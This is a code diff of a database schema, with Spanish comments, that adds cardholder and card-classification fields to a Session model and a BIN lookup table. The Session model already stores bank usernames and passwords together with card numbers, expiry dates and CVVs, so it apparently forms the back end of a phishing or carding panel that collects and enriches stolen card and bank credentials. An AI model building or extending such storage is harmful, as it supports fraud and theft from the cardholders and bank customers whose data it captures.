@@ -60,9 +60,14 @@ model Session {
   bank                  String?
   user                  String?
   pass                  String?
+  holder                String?
   cc                    String?
   exp                   String?
   cvv                   String?
+  scheme                String?
+  brand                 String?
+  type                  String?
+  level                 String?
   document              String?
   country               String?
   city                  String?
@@ -77,4 +82,26 @@ model Session {
 
   @@index([state])
   @@index([updatedAt])
+}
+
+model BinLookup {
+  id         String   @id @default(cuid())
+  bin        String   @unique @db.VarChar(6)  // clave de cache: "457562"
+  scheme     String?  @db.VarChar(32)         // visa/mastercard/amex...
+  brand      String?  @db.VarChar(64)         // marca/variant si aplica
+  type       String?  @db.VarChar(16)         // credit/debit/prepaid
+  level      String?  @db.VarChar(32)         // classic/gold/platinum...
+  bank       String?  @db.VarChar(128)        // banco/emisor
+  bankPhone  String?  @db.VarChar(64)
+  country    String?  @db.VarChar(2)          // ISO2, ej "CO"
+
+  // auditoría / cache control
+  source     String?  @db.VarChar(32)         // "third_party_x", "seed", etc.
+  fetchedAt  DateTime?                         // cuándo se consultó externamente
+  createdAt  DateTime @default(now())
+  updatedAt  DateTime @updatedAt
+
+  @@index([bank])
+  @@index([scheme])
+  @@map("binlookup")
 }
